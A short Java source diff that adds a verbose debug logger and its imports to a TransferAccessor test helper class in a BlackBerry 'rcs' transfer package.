@@ -2,9 +2,12 @@ package com.ht.tests.accessor;
 
 import com.ht.rcs.blackberry.transfer.ProtocolException;
 import com.ht.rcs.blackberry.transfer.Transfer;
+import com.ht.rcs.blackberry.utils.Debug;
+import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class TransferAccessor extends Transfer {
-
+	protected static Debug debug = new Debug("TransferAccessor",
+           DebugLevel.VERBOSE);
 	public TransferAccessor() {
 		super();
 	}
